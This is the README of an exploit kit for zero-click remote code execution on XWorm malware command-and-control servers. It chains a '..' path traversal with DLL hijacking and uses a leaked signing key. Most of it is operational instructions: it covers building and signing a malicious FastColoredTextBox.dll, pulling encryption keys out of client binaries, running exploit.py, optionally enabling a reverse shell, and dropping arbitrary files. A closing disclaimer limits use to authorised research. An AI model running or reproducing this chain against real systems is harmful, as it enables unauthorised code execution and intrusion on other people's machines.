# XWorm C2 0-Click RCE Exploit

## Vulnerability Overview

XWorm C2 server (V6.5+) contains multiple chained vulnerabilities enabling **zero-click Remote Code Execution** on the threat actor's machine. No operator interaction is required beyond the initial connection.

### Vulnerability Chain

| # | Vulnerability | File | Impact |
|---|--------------|------|--------|
| 1 | No client authentication | `Messages.cs` | Any TCP connection can register as a client |
| 2 | Client-triggered UI forms | `Messages.cs` | Clients can open FileManager, VBCode forms on C2 |
| 3 | Path traversal in downloadedfile | `Messages.cs` | Arbitrary file write to C2 filesystem |
| 4 | Lazy-loaded DLL dependency | `VBCode.cs` | `FastColoredTextBox.dll` only loaded on first use |
| 5 | Private key leaked in OSS repo | `FCTB_key.snk` | Full strong-name signing possible without bypass |

---

## Attack Chain

```
Attacker                                    XWorm C2
   |                                           |
   |-- INFO (register as fake client) -------->|  Client appears in C2 panel
   |                                           |
   |-- FileM (open FileManager) -------------->|  FM window auto-opens
   |                                           |
   |<-------------- GetDrives ----------------|  C2 asks for drive list
   |                                           |
   |-- FileManager (fake drives) ------------>|  Drive list displayed
   |                                           |
   |-- downloadedfile (HWID="..") ----------->|  Path traversal
   |   filename=FastColoredTextBox.dll         |  Overwrites DLL in XWorm root
   |                                           |
   |-- Compiler (trigger VBCode form) ------->|  C2 creates VBCode form
   |                                           |  -> InitializeComponent()
   |                                           |  -> new FastColoredTextBox()
   |                                           |  -> .NET loads malicious DLL
   |                                           |  -> PAYLOAD EXECUTES on C2
```

### Why It Works

**No authentication**: XWorm accepts `INFO` messages from any TCP connection with no challenge-response or token verification.

**Client-controlled form creation**: The `Compiler` message causes the C2 to call `new VBCode().Show()` with no operator confirmation.

**Path traversal**: The `downloadedfile` handler checks for `\` and `/` in the HWID but not `..`. Using `HWID=".."` causes:
```
Path.Combine(StartupPath, "ClientsFolder", "..") -> {StartupPath}\
```
This writes files directly into XWorm's root directory.

**Lazy DLL loading**: `FastColoredTextBox.dll` is only used by `VBCode.cs`. It is not loaded at startup — only when the Compiler form is first instantiated. The exploit overwrites the DLL on disk before triggering the load.

**Strong name**: The original DLL is strong-named (`PublicKeyToken=fb8aa12b994ef61b`). The private key (`FCTB_key.snk`) was leaked in the FastColoredTextBox open-source repository, allowing full cryptographic signing of the replacement DLL. The CLR accepts it with no bypass required.

### Important: Race Condition

The exploit only works against a **fresh XWorm process that has never opened the Compiler form**. Once the Compiler form is opened (by a previous exploit run or by the legitimate operator), .NET loads and locks `FastColoredTextBox.dll` for the lifetime of the process. A process restart is required before the DLL can be replaced again.

In a real engagement this is a non-issue — you are targeting a running C2 that has not necessarily had its Compiler form opened yet.

### Root Cause: Path Traversal (`Messages.cs`)

```csharp
string text17 = Path.Combine(Application.StartupPath, "ClientsFolder", array[1]);

// Only checks for slashes - misses ".."
bool flag176 = array[3].Contains("\\") | array[3].Contains("/")
             | array[1].Contains("\\") | array[1].Contains("/");

if (!flag176)
{
    Directory.CreateDirectory(text17);
    File.WriteAllBytes(text17 + "\\" + array[3],
        Helper.Decompress(Convert.FromBase64String(array[2])));
}
```

### Root Cause: DLL Hijacking (`VBCode.Designer.cs`)

```csharp
// Triggers .NET to load FastColoredTextBox.dll from the app directory
this.editor = new global::FastColoredTextBoxNS.FastColoredTextBox();
```

Only executes when a `Compiler` message is received:

```csharp
if (Operators.CompareString(text, "Compiler", false) == 0)
{
    new VBCode { C = C, ... }.Show();
}
```

---

## File Structure

```
Exploit/
├── exploit.py                  # Main exploit script
├── build.bat                   # Build script (Windows)
├── FCTB_key.snk                # Original FCTB private key (from OSS repo)
├── payload/
│   └── FastColoredTextBox.cs   # Malicious DLL source - edit payload here
└── README.md                   # This file
```

---

## Prerequisites

### Python dependencies
```bash
pip install pycryptodome
```

### .NET Framework SDK (for building the DLL)
Must have `csc.exe` and `sn.exe` available. These ship with:
- Visual Studio (any version)
- .NET Framework SDK / Windows SDK

To check:
```bat
where csc.exe
where sn.exe
```

If not on PATH, `csc.exe` is typically at:
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
```
And `sn.exe` at:
```
C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\sn.exe
```

---

## Step 1: Build the Payload DLL

### Edit the payload (optional)

Open `payload\FastColoredTextBox.cs` and find this line:
```csharp
psi.Arguments = "/c calc.exe";  // <-- CHANGE THIS
```
Change it to your desired command, or uncomment the `ReverseShell()` call and set your IP/port.

### Compile and sign

```bat
csc.exe /target:library ^
        /out:FastColoredTextBox.dll ^
        /keyfile:FCTB_key.snk ^
        /platform:x64 ^
        /reference:System.dll ^
        /reference:System.Windows.Forms.dll ^
        /reference:System.Drawing.dll ^
        payload\FastColoredTextBox.cs
```

> **`/platform:x64` is required.** XWorm C2 is a 64-bit process
> (`Framework64\clr.dll`). A 32-bit or AnyCPU DLL will be rejected
> with `hr = 0x8007000b` (invalid assembly platform).

### Verify the output

```bat
REM Check public key token - must be fb8aa12b994ef61b
sn.exe -T FastColoredTextBox.dll

REM Check architecture - must show PE32+ and 32BITREQ : 0
corflags.exe FastColoredTextBox.dll

REM Verify cryptographic signature is valid
sn.exe -v FastColoredTextBox.dll
```

Expected output from `corflags`:
```
PE        : PE32+
32BITREQ  : 0
Signed    : 1
```

---

## Step 2: Obtain C2 Credentials

Extract from a compiled XWorm client binary using dnSpy or ILSpy:

| Field | Location in client | Flag |
|-------|-------------------|------|
| AES Key | `Settings.KEY` | `--key` |
| SPL separator | `Settings.SPL` | `--spl` |
| Mutex | `Settings.Mutex` | `--mutex` |

---

## Step 3: Run the Exploit

### Zero-click RCE (full chain)

```bash
python3 exploit.py <C2_IP> <C2_PORT> FastColoredTextBox.dll --zero-click \
  --key <BASE64_AES_KEY> \
  --spl <BASE64_SPL> \
  --mutex <MUTEX_VALUE>
```

Example:
```bash
python3 exploit.py 192.168.1.100 6000 FastColoredTextBox.dll --zero-click \
  --key "s1U+2x48Km7SegD7QAOVOg==" \
  --spl "RlbgtDR+OhsBbMU3ei9paQ==" \
  --mutex "jFCdULBmD41ZHVkY"
```

### File write only (no RCE trigger)

Writes an arbitrary file to the C2 filesystem without triggering execution. Useful for dropping other payloads.

```bash
python3 exploit.py <C2_IP> <C2_PORT> payload.dll \
  --hwid ".." --filename evil.dll \
  --key <KEY> --spl <SPL> --mutex <MUTEX>
```

---

## Troubleshooting

### `hr = 0x8007000b` — Invalid assembly platform
You compiled with `/platform:x86` or no platform flag. Recompile with `/platform:x64`.

### `The process cannot access the file because it is being used by another process`
XWorm already loaded the original DLL (Compiler form was opened previously). Fully restart XWorm and run the exploit against the fresh process.

### `Method not found: FastColoredTextBoxNS.FastColoredTextBox.set_X`
Your stub is missing a property. Cross-reference `VBCode.Designer.cs` against the stub. The provided `FastColoredTextBox.cs` already covers all properties from V6.5.

### `Could not load file or assembly` / manifest mismatch
Enable Fusion logging to get the exact CLR rejection reason:
```powershell
New-Item -Path "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Fusion" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Fusion" -Name "EnableLog" -Value 1 -Type DWord
Set-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Fusion" -Name "LogFailures" -Value 1 -Type DWord
Set-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Fusion" -Name "LogPath" -Value "C:\FusionLog\" -Type String
New-Item -ItemType Directory -Path "C:\FusionLog" -Force
icacls "C:\FusionLog" /grant Everyone:(OI)(CI)F
```
Restart XWorm, reproduce the error, check `C:\FusionLog\` for the bind log.

---

## Legal Disclaimer

This exploit is provided for **educational and authorized security research purposes only**. Unauthorized access to computer systems is illegal. Use this tool only on systems you own or have explicit written permission to test.

**The authors are not responsible for misuse of this tool.**